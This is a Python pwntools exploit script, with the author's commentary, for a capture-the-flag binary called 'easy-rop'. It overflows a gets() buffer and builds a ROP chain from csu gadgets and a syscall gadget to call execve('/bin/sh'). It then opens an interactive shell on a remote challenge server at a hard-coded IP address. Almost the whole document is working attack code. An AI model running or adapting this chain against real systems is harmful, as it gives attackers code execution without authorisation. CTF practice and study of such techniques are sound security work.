#!/usr/bin/env python3
import time
from pwn import *

#The chall binary has NX enabled which means we have to make ROP Chain to gain shell...
#But the binary does not have got.plt and .plt section..so no memory leak is here to defeat aslr...
#But after analyzing the binary a bit..There is a syscall gadget
#But it is not a normal syscall gadget ,ret it has a jump in it..Let's build a superb plan to gain a shell
#It has a gets which is vulnerable to buffer overflow and 64 bit binary ...As normal ret2plt and ret2system does not work here
#The plan is to make a shellcode using ROPchain taking advantage of the syscall gadget.....
#Brief idea is to overflow and return to gets function to make a pointer to init function as there is no dynamic section present
#And return to csu gadgets to make up the registers and call to init to make up rax to 0 and when return to syscall gadget to make a read syscall  
#And then place /bin/sh string,pointer to syscall gadget and then 0x8000 to bypass compare
#And then finally using some instructions in puts to ready up regs and then return to csu gadget 2 to finally make up the execve syscall 

e = ELF("./easy-rop")
r = remote("65.1.92.179",49153)
rop = ROP(e)
pop_rdi = rop.find_gadget(['pop rdi'])[0]    #Not a normal pop rdi ret gadget but this time pop rdi pop rbp ret gadget
r.recv()
detonator = b'A' * 72                        #Padding of 72 'A's to reach till the return address
detonator+=p64(pop_rdi)                      #return to pop rdi gadget
detonator+=p64(0x4c2220)                     #.bss address to create a pointer to init address as there is no dynamic section present
detonator+=b'A' * 8                          #Junk rbp value
detonator+=p64(e.symbols['gets'])            #Return to gets function to create a fake pointer of init section to .bss
detonator+=p64(0x402ef9)                     #Return to csu gadget 1 to ready up the registers
detonator+=p64(623684)                       #pop rbx value to make up the call to .bss pointer to init
detonator+=p64(0)                            #pop ebp which moves to rdi value to 0 which is fd stdout(read 1st args)
detonator+=p64(0x4c2228)                     #pop r12 which moves to rsi value to address of .bss+8(read 2nd args)
detonator+=p64(24)                           #pop r13 which moves to rdx value to 24 which is the size arguement(read 3rd args)
detonator+=p64(623685)                       #pop r14 to the value of rbx + 1 for the cmp to pass through 
detonator+=p64(0)                            #pop r15 to 0 as there is already rbx*8 points to init address
detonator+=p64(0x402ee0)                     #return address to csu gadget 2
detonator+=p64(0) * 7                        #As registers have been already ready lets junk out the register
detonator+=p64(0x418d59)                     #Return to syscall gadget to perform read syscall
detonator+=p64(0)                            #Junk values to pass rsp,0x8
detonator+=p64(59)                           #pop rbx to 59(syscall number to execve) which will pass to r8 then to rax
detonator+=p64(0x4c2238)                     #pop rbx with the value of address of 0x8000 to make test fail and to make cmp 
                                             #to set zero flag to jump to 0x418cd4 to setup rax value to execve syscall
detonator+=p64(0)                            #pop r12 which moves to rsi in csu gadget 2 with null values(execve 2nd args)
detonator+=p64(0)                            #pop r13 which moves to rdx in csu gadget 2 with null values(execve 3rd args)
detonator+=p64(0x418c97)                     #return to cmp instruction above cmovbe to set zero flag to move the rax value to 59
detonator+=p64(0)                            #Junk value to pass rsp,0x8 
detonator+=p64(623686)                       #Calculated value to make rbx*8 to point to syscall pointer in .bss to make syscall
detonator+=p64(0x4c2228)                     #pop rbp to address of /bin/sh string which moves to rdi in csu gadget 2
detonator+=p64(0) * 2                        #pop r12 and r13 to null which moves to rsi and rdx in csu gadget 2 
detonator+=p64(0x402ee0)                     #return to csu gadget 2 to get near to our long shell
r.sendline(detonator)                        #send the detonator which creates the path to our shell
time.sleep(0.1)                              #Small time delay to send the pointer to init addess using gets
init_address = p64(0x401000)                 #Pointer to init section to make the call in csu gadget 2
r.sendline(init_address)                     #Send the pointer to init section
time.sleep(0.1)                              #small time delay to send the bomb 
bomb = b"/bin/sh\x00" + p64(0x418d59) + p64(0x8000) #Craft the bomb which is essentially /bin/sh string,pointer to syscall gadget
                                                    #which gets makes up the call in csu gadget 2 and the rbp compare to pass
r.sendline(bomb)                                    #send the bomb to the .bss 
r.interactive()                                     #Voila!!!!!!It is shell !!!!!!!!
r.close()


#As in a hurry in CTF I was wrong to return to  csu gadgets and a read syscall was unnecessary.I could use gets to inject the
#necessary things and return to puts at 0x418d59 ready up some registers and then to 0x418dc97 amd then ready up rax regs to execve 
#finally to setup args to execve syscall return to csu gadget 2 and finally in the call in csu gadget 2 make it to syscall gadget 
#to get a shell!!!!
